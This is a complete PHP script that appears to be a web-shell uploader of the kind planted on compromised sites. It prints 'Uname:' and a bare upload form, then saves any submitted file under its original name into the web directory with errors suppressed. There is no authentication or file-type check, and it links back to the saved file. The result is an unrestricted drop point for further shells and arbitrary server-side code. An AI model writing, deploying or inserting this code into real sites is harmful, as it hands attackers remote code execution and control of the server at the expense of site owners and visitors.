<?php
echo "Uname:";
if(isset($_POST['Submit'])){
    $maxfile = '2888888'; 
    $file_name = $_FILES['image']['name'];
    $temporari = $_FILES['image']['tmp_name'];
    if (isset($_FILES['image']['name'])) {
        $abod = $file_name;
        @move_uploaded_file($temporari, $abod);
 
echo"<center><b>Link => <a href='$file_name' target=_blank>$file_name</a></b></center>";	
}};
echo'
<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form></br><br><center>GIF69</center>';
?>